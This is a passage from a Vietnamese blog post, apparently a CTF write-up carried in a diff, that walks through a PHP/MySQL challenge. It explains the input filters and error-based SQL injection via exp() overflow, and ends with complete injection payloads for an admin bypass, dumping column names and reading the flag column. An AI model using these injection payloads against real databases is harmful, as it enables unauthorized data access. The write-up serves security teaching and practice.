+      <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"nice!"</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="k">die</span><span class="p">(</span><span class="s2">"no admin"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nb">readfile</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Đầu tiên thì thấy được trong source này có 3 tham số nhận đầu vào là <code class="language-plaintext highlighter-rouge">id, ai_di, source</code>. Ở source thì chỉ có chức năng là đọc file. (cho source). Ở <code class="language-plaintext highlighter-rouge">id</code> thì qua preg_match để filter một số function trong mysql và 1-9 và 1 vài kí tự. 0 không được xuất hiện nhiều hơn 1 lần trong input của mình.</p>
+
+<p>Ở đây sót lại mốt số thứ có thể sài được như là <code class="language-plaintext highlighter-rouge">union select from 0 ()</code> và một số thứ khác, mọi người có thể tìm thêm :)). 
+<code class="language-plaintext highlighter-rouge">$query = "SELECT id,flag_name,flag_fake FROM flag WHERE id={$id};";</code> id mình truyên vào được đưa vào query này và sau đó lấy ra các giá trị <code class="language-plaintext highlighter-rouge">id, flag_name, flag_fake</code> và show ra màn hình.
+Ở <code class="language-plaintext highlighter-rouge">id</code> filter còn sót 0 nên mình có thể thử nhập id=0
+<img src="https://user-images.githubusercontent.com/54855855/130489998-0ca3f220-61d0-4eb4-b323-d6e963d28d0e.png" alt="image" />
+Nhìn vào như vậy thì cũng có thể thấy được flag real không nằm trong 3 cột này mà cần phải tìm cột khác chưa flag real.</p>
+
+<p>Tiếp tục đến với <code class="language-plaintext highlighter-rouge">ai_di</code> thì chúng được filter các fucntion trong mysql như <code class="language-plaintext highlighter-rouge">id</code>. Các kí tự cũng như thế nhưng chỉ khác number chỉ filter từ 2-9, 1 không được xuất hiện quá 1 lần và 0 không xuất hiện quá 2 lần trong input.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT id,flag_name,flag_fake FROM flag WHERE id=</span><span class="si">{</span><span class="nv">$ai_di</span><span class="si">}</span><span class="s2">;"</span><span class="p">;</span>
+      <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"nice!"</span><span class="p">;</span>
+      <span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">ai_di</code> sẽ được đưa vô và execute câu query trên. Nếu có lỗi thì sẽ dump ra lỗi của query đó <code class="language-plaintext highlighter-rouge">echo mysqli_error($conn);</code>. Execute thánh công sẽ thì sẽ in ra <code class="language-plaintext highlighter-rouge">nice</code>.
+Nhìn vào code trên thì chắc ai cũng đoán được là dựa vô đây để dump ra các cột còn lại có trong <code class="language-plaintext highlighter-rouge">flag</code> (Error-Based SQL Injection) và từ đó sử dụng <code class="language-plaintext highlighter-rouge">?id</code> ban đầu để đọc data column đó.</p>
+
+<p>Ở preg_match filter còn sót một số hàm toán như <code class="language-plaintext highlighter-rouge">exp power</code>, khi truyền vào một số đủ lớn thì 2 hàm đó sẽ trả về kết quả vượt quá range của INT và dump ra lỗi, mình sẽ chain với câu query của mình =&gt; dump được tên cột. Mọi người có thể lên google tìm hiểu về 2 hàm này và cách sử dụng nó để dump ra column có trong table.
+Link bài viết mình để ở đây
+<a href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/">Error Based SQL Injection Using EXP</a>. Nhưng trong bài viết này người ta sử dụng <code class="language-plaintext highlighter-rouge">~</code> hoặc truyển number vào nhưng những thứ đó thì mình đã filter. Chỉ có sót lại là số 0 mà 0 thì bạn nhập bao nhiêu 0 vào cũng không thể vượt quá range của INT được.</p>
+
+<p>Tới đây nếu ai vượt qua được step 1 để vô được <code class="language-plaintext highlighter-rouge">flag.php</code> thì dễ rồi hehe. Ở step đó là cách tạo số và giờ sử dụng lại nó thôi.</p>
+
+<h3 id="payload-3">Payload</h3>
+<p>Mình sẽ để full payload từ step 1 luôn nhé.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Payload lên admin -&gt;  ?id=0 union select 0,(select((select (day(curdate()))) %2b (select(month(curdate()))) %2b (select(year(curdate())))))
+
+Payload dump column -&gt; ?ai_di=0 *(select (exp((SELECT year(curdate())) %2b (select 0 from (SELECT * from flag limit 1) as a))))
+
+Payload đọc flag -&gt; ?id = 0 union select null,null,(select flag_real_siu_cap from flag)
+</code></pre></div></div>
+<p>Ở bài này có 1 solved và sử dụng hex, mọi người có thể tìm hiểu về hex và sử dụng nó cũng được nhé. Mình đã quên hàm đó :3</p>
+
+<h2 id="lời-kết">Lời kết</h2>
+<p>Cảm ơn mọi người đã xem phần writeup này, các chall mình giải được chỉ có bấy nhiêu, ai có thắc mắc thì hãy liên hệ mình.</p>
+
+<p>THANK YOU !</p>
+  </div>
+
+  <footer class="post-footer">
+    
+      <div class="post-meta">
+        <i class="fas fa-folder"></i>
+        <ul class="post-taxonomies post-categories">
+          
+          
+            <li class="post-category">
+              
+              <a href="/CTF/categories#ctf">CTF</a>
+            </li>
+          
+        </ul>
+      </div>
+    <nav class="post-pagination" role="navigation">
+      
+        <a class="post-previous" href="/CTF/pwn">
+          <h4 class="post-pagination-label">Prev</h4>
+          <span class="post-pagination-title">
+            <i class="fas fa-arrow-left"></i> [WRITEUP REDPWN CTF 2021]: WEB
+
+          </span>
+        </a>
+      
+
+      
+    </nav>
+  </footer>
+
+  
+  
+</article>
+
+          <footer class="site-footer">
+            <div class="footer-col-wrapper">
+
+  <div class="footer-col">
+    <div class="copyright">
+      
+      
+      
+      
+      <p>Copyright © 2021 Lê Nguyễn Tiến Vinh; All rights reserved.</p>
+      
+    </div>
+  </div>
+
+  <div class="footer-col">
+    <p>Blog security</p>
+  </div>
+</div>
+
+          </footer>
+        </main>
+      </div>
+    </div>
+  </body>
+
+</html>
+
